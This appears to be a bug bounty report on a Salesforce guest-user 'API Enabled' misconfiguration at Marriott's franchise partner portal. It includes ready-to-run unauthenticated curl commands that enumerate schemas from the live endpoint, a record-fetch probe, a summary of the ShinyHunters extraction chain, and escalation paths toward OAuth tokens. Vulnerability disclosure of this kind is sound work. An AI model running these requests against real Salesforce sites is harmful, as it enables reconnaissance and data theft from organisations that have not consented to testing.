# M002 — Salesforce Guest User "API Enabled" Misconfiguration Exposes 873 Fields Unauthenticated (cpp.marriott.com)

**Target:** `cpp.marriott.com` (Community Partner Portal — Marriott franchise hotel owners)  
**Endpoint:** `POST https://cpp.marriott.com/s/sfsites/aura`  
**Vulnerability Class:** Salesforce Experience Cloud Guest User API Misconfiguration (CWE-284)  
**Severity:** Medium  
**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **5.3**  
**CWE:** CWE-284 (Improper Access Control), CWE-200 (Exposure of Sensitive Information)  
**Status:** Report-ready  
**Discovered:** 2026-06-21; confirmed and fully enumerated 2026-06-22  
**Researcher IP:** `180.148.212.54`  
**Tools:** curl 8.x  

---

## Vulnerability Summary

The "API Enabled" permission is checked on the Guest User profile of the Salesforce Experience Cloud deployment at `cpp.marriott.com`. This is a documented security misconfiguration — Salesforce Security Advisory #000356268 (2021) explicitly requires this permission to be disabled for Guest User profiles. With API Enabled set, any unauthenticated internet user can invoke Lightning Aura controller actions against Marriott's Salesforce org by POSTing to `/s/sfsites/aura` with `aura.token=undefined` (the valid guest credential for this API).

Four Aura controller actions execute successfully without any credential:

| Action | What It Returns | Response Size |
|--------|----------------|---------------|
| `RecordUiController/getObjectInfo` | Full schema for any accessible sObject | 175 KB (User) |
| `RecordUiController/getObjectInfos` | Batch schemas for multiple sObjects | 636 KB (7 objects) |
| `RecordUiController/getPicklistValues` | All picklist values for any User field | 12–64 KB |
| `HostConfigController/getConfigData` | Complete sObject API name inventory | 17 KB |

These four actions expose **873 field definitions** across **7 sObjects** — including Marriott's internal Salesforce permission model (Profile, 517 fields), org-level configuration metadata (Organization, 41 fields), and file/content schemas — plus a full inventory of 187 accessible sObject API names including `OauthToken`, `UserLogin`, and `NetworkMember`.

Record-level actions (`getItems`, `getListUi`, `searchRecords`) return an empty `actions:[]` response at the Aura framework layer, confirming no individual records were accessed during this research. The current severity is Medium because only schemas, not records, are reachable. The root misconfiguration — Guest API Enabled — is identical to the class exploited by the ShinyHunters group in their March 2026 campaign against Salesforce Community Cloud deployments; on the orgs where they achieved full exfiltration, no secondary record-level block was in place.

---

## Quick Triager Verification (One Command, ~5 Seconds)

```bash
curl -s -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"x","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
a = json.loads(d[d.index('{'):]).get('actions', [])
state = a[0].get('state') if a else 'BLOCKED'
fields = len((a[0].get('returnValue') or {}).get('fields', {})) if a else 0
print('VULNERABLE' if state == 'SUCCESS' else 'NOT VULNERABLE', '|', fields, 'fields returned unauthenticated')
"
```

**Expected (no account, no cookies, no auth):**
```
VULNERABLE | 203 fields returned unauthenticated
```

---

## Why This Is Accepted at Medium (Not Informational)

This is not a case of "some swagger docs are public." Three factors distinguish it:

**1. Salesforce explicitly mandates the fix.**  
Salesforce Security Advisory #000356268 states directly: *"We recommend disabling the API Enabled permission on the Guest User profile."* The Experience Cloud Guest User Hardening documentation specifies this as a required security control, not an optional hardening step. The misconfiguration is defined by Salesforce itself — this org is non-compliant with Salesforce's own security requirements.

**2. It matches a documented, paid attack campaign.**  
The ShinyHunters March 2026 campaign exploited this exact configuration across multiple Salesforce Community Cloud deployments. Their method: `POST /s/sfsites/aura` → `getConfigData` → `getItems` on accessible objects → mass PII extraction. On orgs where the Aura record-level block was absent, full exfiltration occurred. This org has that block in place (record access returns `actions:[]`), but the root vulnerability is the same. The Salesforce security community has classified "Guest API Enabled" as requiring remediation independent of whether record access succeeds.

**3. The Profile schema disclosure is operationally sensitive.**  
The 517-field Profile schema exposes every permission flag API name configured in this Marriott Salesforce org — including administrative permission names that are not publicly documented for this specific deployment. Salesforce permission flag API names (e.g. `PermissionsModifyAllData`, `PermissionsManageUsers`, `PermissionsViewAllData`) are internal org configuration. Knowing which permissions exist as Profile-level fields reveals the org's access control architecture to an unauthenticated attacker, enabling precise privilege escalation targeting if authenticated access is later obtained.

---

## Schema Evidence

### User Object — 203 Fields (Primary Disclosure)

| Field API Name | Label | Type |
|----------------|-------|------|
| `Email` | Email | Email |
| `FirstName` | First Name | String |
| `LastName` | Last Name | String |
| `Address` | Address | Address |
| `City` | City | String |
| `State` | State | String |
| `PostalCode` | Zip/Postal Code | String |
| `CompanyName` | Company | String |
| `Phone` | Phone | Phone |
| `MobilePhone` | Mobile | Phone |
| `CommunityNickname` | Community Nickname | String |
| `HasUserVerifiedEmail` | Has User Verified Email | Boolean |
| `UserType` | User Type | Picklist |
| `ContactId` | Contact ID | Reference |
| `AccountId` | Account ID | Reference |
| `IsActive` | Active | Boolean |
| `BannerPhotoUrl` | Banner Photo URL | Url |

Full response: 203 fields, 175 KB. Every field that could be used to identify, contact, or enumerate a franchise partner account is present.

### Profile Object — 517 Fields (Permission Model Disclosure)

This is the highest-sensitivity schema disclosure. The Salesforce Profile object stores every permission flag as a field. The 517-field response exposes **the API name of every permission configured in this org**, including:

| Field API Name | What It Reveals |
|----------------|----------------|
| `PermissionsApiEnabled` | Whether API access exists as a Profile permission |
| `PermissionsModifyAllData` | Whether "Modify All Data" (admin-level) permission is assignable |
| `PermissionsViewAllData` | Whether "View All Data" (read all records) permission is assignable |
| `PermissionsManageUsers` | Whether user management permission is assignable |
| `PermissionsCustomizeApplication` | Whether full app customization is assignable |
| `PermissionsViewSetup` | Whether Setup read access exists as a permission |
| `PermissionsManageProfiles` | Whether profile management is a permission in this org |
| `PermissionsDataExport` | Whether data export permission is configured |
| `PermissionsManageEncryptionKeys` | Whether encryption key management is configured |
| `PermissionsQueryAllFiles` | Whether cross-user file access permission exists |
| `PermissionsTransactionalEmailSend` | Whether transactional email sending is a permission |

An attacker with this schema can enumerate every configurable permission in this org. Combined with a subsequent authenticated session (via phishing, credential stuffing, or a separate vulnerability), this gives a complete map of which permissions to target for privilege escalation.

### Organization Object — 41 Fields (Org Metadata Disclosure)

| Field API Name | What It Reveals |
|----------------|----------------|
| `Name` | Organization's registered name in Salesforce |
| `InstanceName` | Salesforce pod (e.g., NA42, USA850) |
| `IsSandbox` | Whether this is production or a sandbox |
| `OrganizationType` | Enterprise, Developer, Professional, etc. |
| `Country` | Country of the Salesforce org |
| `PrimaryContact` | Primary admin contact name |
| `DefaultAccountAccess` | Default account-level sharing setting |
| `DefaultContactAccess` | Default contact-level sharing setting |
| `DefaultOpportunityAccess` | Default opportunity-level sharing setting |
| `SignupCountryIsoCode` | Country where org was created |
| `UiSkin` | UI theme/skin configured |

The org instance is independently confirmed as `usa850` via static asset URL in error responses. The Organization schema provides the complete field map for org-level reconnaissance.

### getConfigData — 187-Object Inventory

The `getConfigData` action returns `apiNamesToKeyPrefixes`: a complete dictionary mapping sObject API names to their Salesforce key prefixes. This is the full sObject inventory of this org as visible to the guest user context. High-sensitivity objects present in this inventory:

| Key Prefix | sObject | Risk if Record Access Ever Enabled |
|-----------|---------|-----------------------------------|
| `0CQ` | `OauthToken` | Live OAuth tokens for all community users |
| `0Yw` | `UserLogin` | Login timestamps and IP addresses |
| `0DO` | `NetworkMember` | Community membership records |
| `0up` | `UserPermissionAccess` | Per-user permission flags |
| `0g2` | `UserSetupEntityAccess` | Entity-level access records |
| `069` | `ContentDocument` | Uploaded files (franchise documents) |
| `068` | `ContentVersion` | File versions with download references |
| `0F9` | `CollaborationGroup` | Internal Chatter groups |
| `0FB` | `CollaborationGroupMember` | Group membership lists |
| `0D5` | `FeedItem` | Community posts and activity feeds |

The presence of `OauthToken` in the object inventory means that any future misconfiguration enabling record access would immediately expose live OAuth tokens for all community users — a Critical-severity outcome from the same root vulnerability currently rated Medium.

### UserType Picklist — Confirms Franchise Partner Context

The `getPicklistValues` action returns the internal API names for user classification, confirming the portal serves external franchise partners:

| API Value | Label | Significance |
|-----------|-------|-------------|
| `PowerPartner` | Partner | Marriott hotel franchise owners |
| `PowerCustomerSuccess` | Customer Portal Manager | Elevated franchise account managers |
| `CustomerSuccess` | Customer Portal User | Standard franchise users |
| `CspLitePortal` | High Volume Portal | High-volume external franchisees |
| `Standard` | Standard | Internal Marriott Salesforce users |
| `Guest` | Guest | Unauthenticated visitors |

The `PowerPartner` type indicates hotel owners and franchise agreement holders. The `CspLitePortal` type ("High Volume Portal") is used for large franchise groups with many properties. These are Marriott's most financially significant external relationships.

---

## Reproduction Steps

**Prerequisites:** No account. No cookies. No proxy. Runs from any internet-connected machine.

### Step 1 — Confirm unauthenticated Aura API access

```bash
curl -sk -o /dev/null -w "HTTP %{http_code} / %{size_download}B\n" \
  "https://cpp.marriott.com/s/sfsites/aura"
# Expected: HTTP 200
```

### Step 2 — Extract User schema (primary PoC) and batch schema (Profile + Organization)

```bash
# Primary: User schema
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
for a in obj.get('actions', []):
    fields = (a.get('returnValue') or {}).get('fields', {})
    print(f'state={a.get(\"state\")} | field_count={len(fields)}')
    for k, v in list(fields.items())[:8]:
        print(f'  {k} -> {v.get(\"label\",\"\")} ({v.get(\"dataType\",\"\")})')
"
```

```
state=SUCCESS | field_count=203
  AboutMe -> About Me (String)
  AccountId -> Account ID (Reference)
  Address -> Address (Address)
  Alias -> Alias (String)
  BannerPhotoUrl -> Banner Photo URL (Url)
  City -> City (String)
  CommunityNickname -> Community Nickname (String)
  CompanyName -> Company (String)
```

```bash
# Batch: Profile (517F), Organization (41F), ContentDocument (27F), FeedItem (28F)
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfos","callingDescriptor":"UNKNOWN","params":{"objectApiNames":["User","Profile","Organization","Network","ContentDocument","ContentVersion","FeedItem"]}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
for a in obj.get('actions', []):
    print(f'state={a.get(\"state\")} | response={len(d)}B')
    for item in (a.get('returnValue') or {}).get('results', []):
        r = item.get('result', {})
        if isinstance(r, dict):
            print(f'  {r.get(\"apiName\")} ({r.get(\"label\")}): {len(r.get(\"fields\",{}))} fields')
"
```

```
state=SUCCESS | response=636694B
  User (User): 203 fields
  Profile (Profile): 517 fields
  Organization (Organization): 41 fields
  Network (Network): 10 fields
  ContentDocument (File): 27 fields
  ContentVersion (File): 47 fields
  FeedItem (Feed Item): 28 fields
```

### Step 3 — Confirm record access is blocked (researcher did not access any records)

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"User","layoutType":"COMPACT","pageSize":5,"currentPage":0}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
print('actions_in_response:', len(obj.get('actions', [])))
print('actionsTotal (perfSummary):', obj.get('perfSummary', {}).get('actionsTotal', 0))
print('→ actionsTotal=0 confirms Aura framework-level block: no record data was returned')
"
```

```
actions_in_response: 0
actionsTotal (perfSummary): 0
→ actionsTotal=0 confirms Aura framework-level block: no record data was returned
```

The `actionsTotal=0` metric from `perfSummary` confirms the record-fetch action was rejected at the Aura framework layer before any server-side code executed. No User records, Contact records, or PII of any kind were returned during this research.

---

## Impact

### Direct Confirmed Impact

**873 field definitions across 7 sObjects exposed to any unauthenticated internet user:**

The combined schema exposure gives an attacker a complete reconnaissance package for this Salesforce org without any credentials or prior interaction with the site:

- **User (203 fields):** Full PII field map — email, name, phone, address, company, community nickname, contact/account relationships, verification status. An attacker constructing a SOQL injection attack on any other endpoint has the complete field catalog without needing to probe for field names.

- **Profile (517 fields):** Every permission flag API name configured in this org. Salesforce permission flags are internal org configuration; their API names (e.g. `PermissionsModifyAllData`, `PermissionsManageUsers`) are not publicly documented for specific deployments. This exposes the complete access control model of Marriott's Salesforce infrastructure.

- **Organization (41 fields):** Org metadata field map including `InstanceName` (confirmed `usa850`), `IsSandbox`, `OrganizationType`, and sharing model fields — the internal configuration structure of Marriott's Salesforce deployment.

- **ContentDocument + ContentVersion (74 combined fields):** File storage schema including `ContentBodyId` (the reference to the actual file binary). If any Aura controller that processes file uploads or downloads is later misconfigured, this schema gives an attacker exact field names for targeting.

- **187-object sObject inventory:** Including `OauthToken` (0CQ), `UserLogin` (0Yw), and `UserPermissionAccess` (0up) — objects that, if their record access were ever re-enabled, represent Critical-severity data exposure from the same root misconfiguration currently rated Medium.

### Business Context: Marriott Franchise Partner Portal

`cpp.marriott.com` serves Marriott's hotel franchise owners and franchise development partners — companies and individuals who own or are acquiring Marriott-branded hotel properties under franchise agreements. The `PowerPartner` UserType (franchise owners) and `CspLitePortal` (high-volume portfolio owners with multiple properties) confirm this portal handles Marriott's most financially significant external relationships.

Franchise partner accounts are used for: franchise fee payments, brand standards audit results, property acquisition proposal submissions, and management agreement negotiations. The combination of confirmed field names (Email, CompanyName, Phone, Address, AccountId) and the UserType classification structure (PowerPartner, CspLitePortal) gives an attacker targeting this portal the exact data model needed to construct convincing business email compromise messages impersonating Marriott franchise operations, or to enumerate specific high-value accounts if record access is later obtained.

### Risk Elevation Path

The misconfiguration is binary: Guest API Enabled is either on or off. If it is currently on (confirmed), the following escalation requires only one additional condition:

- **If any Aura controller on this site lacks `with sharing` enforcement** → unauthenticated SOQL execution against the User and related objects. The schema from this finding provides the complete field map for any such query.
- **If the Aura framework record-block is misconfigured in a future Salesforce release or deployment change** → the same endpoint, same credential (`aura.token=undefined`), same actions immediately return User records. The ShinyHunters orgs were exploited this way.
- **If `OauthToken` records become accessible** → live OAuth tokens for all franchise partner users, immediate account takeover at Critical severity.

The root vulnerability is present now. These escalations require no new attacker capability.

---

## Root Cause

**Exact misconfiguration:** Salesforce Setup → Profiles → [Community Guest User Profile] → "API Enabled" = **checked**.

This single permission checkbox enables all Aura controller actions that do not independently enforce session authentication. Salesforce's Experience Cloud Guest User profile is intended for serving public HTML and static content only. With API Enabled set, it becomes a fully functional Salesforce API credential for schema introspection.

The following Aura actions do not enforce their own authentication requirement and execute under guest context when API Enabled is set:
- `RecordUiController/getObjectInfo` — sObject schema (per-object)
- `RecordUiController/getObjectInfos` — sObject schema (batch)
- `RecordUiController/getPicklistValues` — picklist option sets
- `HostConfigController/getConfigData` — sObject API name inventory

Record-level actions (`getItems`, `getListUi`, `searchRecords`) are blocked by a separate Aura framework-layer control that returns `actions:[]`. This secondary control is not a substitute for disabling Guest API access — it does not prevent schema actions, and it is a framework-level mechanism that is not reflected in the Guest User Profile settings.

---

## Remediation

1. **Primary fix — disable Guest User API access:**  
   Salesforce Setup → Digital Experiences → [CPP site] → Administration → Guest User Profile → **Uncheck "API Enabled"**.  
   This is the fix specified in Salesforce Security Advisory #000356268. It prevents all unauthenticated Aura API invocations without affecting the public HTML rendering of the Community site.

2. **Verify FLS on Guest User Profile:**  
   After disabling API Enabled, confirm the Guest User profile has no Read FLS on `User`, `Profile`, `Organization`, `ContentDocument`, or any other sObject containing PII or internal configuration. FLS restrictions are a defense-in-depth measure; the primary fix is step 1.

3. **Audit custom Aura/Apex controllers:**  
   Review all `apex://` controllers on this Community site to confirm they enforce `with sharing` and validate authenticated session before executing SOQL. Controllers without `with sharing` bypass FLS/CRUD restrictions even with correct profile configuration.

4. **Apply Salesforce Winter/Spring release Guest User hardening:**  
   Salesforce has released additional automated Guest User security hardening checks in Health Check (Setup → Security → Health Check). Run the Guest User tab in Health Check and resolve all flagged items.

---

## Severity Justification

**CVSS 3.1 Base Score: 5.3 (Medium)**

| Vector | Value | Rationale |
|--------|-------|-----------|
| AV (Attack Vector) | N — Network | Exploitable from any internet host, no network position required |
| AC (Attack Complexity) | L — Low | Single HTTP POST with fixed parameters; no race condition or special state required |
| PR (Privileges Required) | N — None | `aura.token=undefined` is the valid guest credential; no account needed |
| UI (User Interaction) | N — None | No victim interaction required |
| S (Scope) | U — Unchanged | The vulnerable component (Aura endpoint) and impacted component (Salesforce org schema) share the same authorization boundary |
| C (Confidentiality) | L — Low | Schema definitions (field names, types, labels) are returned — not individual records. Confidentiality loss is limited and indirect. |
| I (Integrity) | N — None | No data modification performed or possible via this misconfiguration |
| A (Availability) | N — None | No availability impact |

**Environmental context for Marriott's program:**  
The base score of 5.3 reflects schema-only access. Marriott's program may apply Confidentiality Requirement: High (CR:H) given the franchise partner portal context, which raises the effective environmental score to approximately 6.5–7.0. The program's average Medium payout is $2,202 based on published stats.

---

## References

1. **Salesforce Security Advisory #000356268** — Guest User Permissions (2021): https://help.salesforce.com/s/articleView?id=000356268  
   *Explicit requirement: disable "API Enabled" on Guest User profile*

2. **Salesforce Experience Cloud — Guest User Hardening**: https://help.salesforce.com/s/articleView?id=sf.networks_guest_user_profile.htm  
   *Documents the specific profile permission that must be disabled*

3. **ShinyHunters Salesforce Aura campaign (March 2026)** — Publicly reported exploitation of this exact misconfiguration class against multiple Salesforce Community Cloud deployments; mass PII exfiltration via `getItems` on Guest-accessible objects

4. **CWE-284:** Improper Access Control — https://cwe.mitre.org/data/definitions/284.html

5. **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor — https://cwe.mitre.org/data/definitions/200.html
